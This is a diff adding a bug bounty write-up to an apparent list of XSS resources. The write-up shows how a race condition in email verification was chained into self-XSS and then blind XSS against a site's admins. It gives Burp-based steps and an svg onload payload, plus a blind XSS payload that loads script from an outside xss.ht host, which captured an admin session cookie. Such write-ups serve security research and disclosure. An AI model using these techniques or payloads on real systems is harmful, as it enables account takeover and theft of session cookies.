@@ -23,6 +23,74 @@
 ## Cross Site Scripting (XSS)
 
 - [From P5 to P2 to 100 BXSS](https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82)
+
+I decided to start over and create a new account.
+
+When I filled all the details, they asked me to verify my email first but I could also change the email to another one in case I made a mistake. I directly thought about Race-Condition to use any email without verifying it.
+
+Here’s how you can do it (we’ll assume that we have access to lasok@dot-coin.com and we want to register with aa@aa.com)
+
+1/ Add an email to the account and open the email with the verification link but don’t click on it yet (In my case I added lasok@dot-coin.com and opened the mail they sent me)
+
+2/ On the website click on “change email”. Change the email to the one you want to use without verification but don’t click on send link now. (Now I changed the email to aa@aa.com)
+
+Here comes the tricky part.
+
+You have to click on the verification link and change your email at the same time.
+
+You can do that without burp but you may have to try a few times before it works so here is a method to make it work every time:
+
+Start burp and turn intercept on
+
+Now open the verification link you received on lasok@dot-coin.com then switch tab and validate the new email on the website (aa@aa.com) then turn intercept off. Burp will forward the 2 requests together and that’s what we want.
+
+aa@aa.com was verified and I could now login to my account.
+
+In this case what you should do is to register with email@company.com, sometimes you can get access to some cool admin features.
+
+But unfortunately for me it wasn’t the case here but I still reported it and as expected, closed as P5.
+
+
+Now we have to escalate this to give a valid impact in order to be a valid bug.
+
+After some minutes I tried to escalate this to XSS.
+
+Did the same process but instead of entering a fake email in the second step I entered : <svg/onload=alert(1)> and XSS triggered. But since my email is private and only me can see it, this is a Self-XSS.
+
+So we went from Race-Condition (P5) to Self-XSS (P5).
+
+Now, what ?
+
+I remembered that this private program also had a forum dedicated to their site.
+
+I did the same process again but instead of entering a regular XSS payload I entered a Blind XSS payload. Mine was : “></script><script src=//m0m0x01d.xss.ht></script> (Tip : Use xsshunter.com tool to find blind xss)
+
+I then went to the forum, created a new weird thread (to be sure that the admin will delete it) and reported my own thread to be sure that the admins see it.
+
+Within hours I got an email alerting me that someone triggered my XSS.
+
+Reading the XSSHunter report :
+
+Triggered at : https://www.company.com/profile/XXXX
+
+Referer : https://forums.company.com/XX/index.php?/topic/123456--/
+
+The admin saw my weird thread, then he clicked on my username → redirected to my profile → XSS triggered
+
+The reason why it triggered was that the admins had the feature to see the email of any user only by visiting their profile.
+
+I now had the session cookie of the admin and I could use it to get access to the internal panel.
+
+So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind XSS.
+
+    Take-away :
+
+    1/ If you’r able to use any email without verification, try registering with email@domain.com you may get access to some admin features
+
+    2/ Always look for the highest severity. Here if the program accepted the bug as P4 I would get 100$ for that instead of 10x the bounty for the XSS
+
+    3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless
+
 - [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)
 - [DOM-Based XSS at accounts.google.com by Google Voice Extension](http://www.missoumsai.com/google-accounts-xss.html)
 - [XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
